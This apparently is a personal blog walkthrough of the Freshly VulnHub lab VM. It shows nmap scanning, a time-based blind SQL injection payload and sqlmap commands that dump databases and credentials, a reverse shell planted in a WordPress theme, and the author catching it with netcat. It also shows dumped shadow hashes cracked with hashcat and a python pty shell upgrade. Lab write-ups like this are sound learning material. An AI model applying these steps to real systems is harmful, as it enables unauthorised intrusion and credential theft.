<p>I did another vulnerable VM. This one is called Freshly and can be found <a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/">here</a>. It is also made by tophatsec, so <a href="http://www.top-hat-sec.com/r4v3ns-blog/new-vm-challenge-freshly">thanks tophatsec</a> for another great VM. Let's get started.</p>
<p>First let's find the machine.<br />
[code lang="bash"]<br />
nmap 192.168.1.1/24<br />
[/code]</p>
<p>Great, now that we got the ip, let's scan it.<br />
[code lang="bash"]<br />
nmap -A -T4 -p- 192.168.1.107                        [12:17:27]</p>
<p>Starting Nmap 7.00 ( https://nmap.org ) at 2016-04-24 12:18 CLST<br />

<p>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />
Nmap done: 1 IP address (1 host up) scanned in 17.45 seconds<br />
[/code]</p>
<p>Okay, so we have a port 80, and SSL-port 443, and port 8080. All web.<br />
On port 80 there is just a star-wars gif. I download it and check it out if exiftool just in case. But nothing of interest.</p>
<p>I fire up ZAP and start doing a Force Browse (DirBusting).<br />
Meanwhile I check out port 8080 and port 443. Both of them seem to lead to a wordpress-installation. I snoop around and find that there is a user named admin (the default user in wordpress). I try to login with admin/admin in /wp-admin but no result. I also try a dictionary-attack but without any luck. But I am not blocked out, so that means there are no plugins with fail2ban -features.</p>
<p>I try some sqlinjections in the store but without success.</p>
<p>So I go back to ZAP to see what it has found. And I can see that it has found a page called /login.php and phpmyadmin. So I head over to login.php and find a login. I use sqlmap to see if there are any vulnerabilities.</p>
<p>So I make a request and the intercept it in burp suite, and copypaste the request to a file I call request.txt. "user" is the parameter that I am testing for injections.</p>
<p>[code lang="bash"]<br />
./sqlmap.py -r request.txt -p user<br />
[/code]</p>
<p>Okay, so sqlmap found a <a href="http://www.sqlinjection.net/time-based/">time-based blind</a>.<br />
[code]<br />
---<br />
Parameter: user (POST)<br />
    Type: AND/OR time-based blind<br />
    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)<br />
    Payload: user=' AND (SELECT * FROM (SELECT(SLEEP(5)))RRpU) AND 'wUfW'='wUfW&amp;password=&amp;s=Submit<br />
---<br />
[/code]</p>
<p>I had never successfully used sqlmap before, so this was a great learning experience. So after finding out that there is a vulnerability I run the following command to get the databases. It really took a long time because it was a time-based attack.</p>
<p>[code]<br />
./sqlmap.py -r request.txt -p user --dbs<br />
[/code]</p>
<p>Output:</p>
<p>[code]<br />
available databases [7]:<br />
[*] information_schema<br />
[*] login<br />
[*] mysql<br />
[*] performance_schema<br />
[*] phpmyadmin<br />
[*] users<br />
[*] wordpress8080<br />
[/code]</p>
<p>Then I wanted the tables and the content, so I ran:<br />
[code]<br />
./sqlmap.py -r request.txt -p user --tables -D wordpress8080</p>
<p>Database: wordpress8080<br />
[1 table]<br />
+-------+<br />
| users |<br />
+-------+<br />
[/code]</p>
<p>[code]<br />
./sqlmap.py -r request.txt -p user --dump -D wordpress8080 -T users                                  [18:45:53]<br />
Database: wordpress8080<br />
Table: users<br />
[1 entry]<br />
+----------+---------------------+<br />
| username | password            |<br />
+----------+---------------------+<br />
| admin    | SuperSecretPassword |<br />
+----------+---------------------+<br />
[/code]</p>
<p>So yeah, not so secret password. I used it to login to wordpress.<br />
This <a href="http://www.binarytides.com/sqlmap-hacking-tutorial/">guide</a> was quite useful to get the hang of sqlmap.</p>
<p>So, admin on a CMS usually means shell. So I went to appearance/editor and then I just copy-pasted my reverse shell into header.php. Probably not the most silent way, but it is easy to remove the code after it has been executed.<br />
Then I fired up netcat. With:<br />
[code]nc -v -l 1234[/code]<br />
-v stands for verbose. -l for listening. And 1234 is the port. The -p flag is not really needed to define the port. </p>
<p>Make sure that your firewall is open.<br />
[code]sudo ufw allow 1234[/code]</p>
<p>So, now I got a shell with the user daemon<br />
[code]<br />
uid=1(daemon) gid=1(daemon) groups=1(daemon)<br />
[/code]</p>
<p>I create a file in /tmp called linEnum.sh where I copypaste the linEnum-file. Then:<br />
[code]<br />
chmod +x linEnum.sh<br />
./linEnum.sh<br />
[/code]</p>
<p>To enumerate important and interesting files. It outputs a lot of stuff, among others this:<br />
/etc/passwd<br />
[code]<br />
user:x:1000:1000<br />
mysql:x:103:111<br />
candycane:x:1001:1001<br />
# YOU STOLE MY SECRET FILE!<br />
# SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;<br />
[/code]</p>
<p>And the following in /etc/shadow</p>
<p>[code]<br />
root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::<br />

mysql:!:16483:0:99999:7:::<br />
candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::</p>
<p>There is also a message in the shadow-file:<br />
# YOU STOLE MY PASSWORD FILE!<br />
# SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;<br />
[/code]</p>
<p>I thought I had to reach root, so I didn't really think of this as the flag. So I copied the hashes and started running hashcat on them, which was fun as it was the first time. So I ran it an all the three hashes, with the following command.</p>
<p>[code]<br />
./hashcat-cli64.bin -m 1800 -a 0 -o found.txt --remove candycane.hash ~/sectools/SecLists/Passwords/10_million_password_list_top_100000.txt<br />
[/code]</p>
<p>I only found the password for candycane which was "password". I didn't manage to crack the other users. </p>
<p>Now I wanted to su up for candycane but it didn't work since I didn't have a tty-shell. And [code]<br />
import pty; pty.spawn('/bin/bash')<br />
[/code]</p>
<p>this didn't work. But I found a workaround. </p>
<p>[code]<br />
echo &quot;import pty; pty.spawn('/bin/bash')&quot; &gt; /tmp/shell.py<br />
ptyhon shell.py<br />
[/code]</p>
<p>So this gave me a tty-shell and I could run su candycane.</p>
<p>So, here I got stuck a while and started looking back in my notes to see if I had missed something. So I took out the content from the databse login</p>
<p>[code]<br />
Database: login<br />
Table: users<br />
[2 entries]<br />
+----------+-----------+<br />
| password | user_name |<br />
+----------+-----------+<br />
| password | candyshop |<br />
| PopRocks | Sir       |<br />
+----------+-----------+</p>
<p>[/code]</p>
<p>And I tried these passwords on user and root. But it didn't work. After many other tries enumerating the system I gave up. And on some other walkthroughs I found that the password for user (which was a sudo-user) and root was SuperSecretPassword. So that was a little bit annoying that I never tried that. And I also found out that it was the same password for the mysql-root user. Which could be found in the login.php-file. So that was a little bit stupid that I never checked that.</p>
<h2>Conclusion</h2>
<p>All in all it was a great VM. I got to learn tools like hashcat and sqlmap, which I am sure will come in handy on other VMs. I also learned about wpscan while reading other walkthroughs. I was surprised that SuperSecretPassword was not found in my password-dictionaries that I tried.</p>
<p>Other things that I missed was playing around with phpmyadmin. I read in some other walkthroughs that you could figure out the DBMS from it. That would have been good.</p>
<p>But at least I got the flags. </p>
